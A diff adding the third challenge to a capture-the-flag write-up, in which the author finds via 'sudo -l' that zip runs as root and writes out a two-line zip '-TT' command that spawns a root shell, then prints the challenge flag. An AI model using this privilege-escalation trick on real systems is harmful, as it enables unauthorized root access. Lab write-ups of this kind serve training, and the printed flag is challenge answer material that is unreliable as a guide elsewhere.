@@ -47,4 +47,21 @@ Using which we able to do ssh to nsctf user and read **.\_\_flag2\_\_** file.
 
 ## Challange 3:
 
+Can you become root?
 
+![](./media/10.png)
+
+First step I done was running command **sudo -l** and observed that we can run zip command as a sudo. so tried below commands:
+
+```
+ echo "/bin/sh" > /tmp/win.sh
+ sudo zip z.zip * -T -TT /tmp/win.sh 
+```
+
+![](./media/11.png)
+
+and we read **.\_\_root\_flag\_\_** file.
+
+*flag was: nsctf{574ca321d4b0f3cca3d6763567095b17}*
+
+![](./media/12.png)
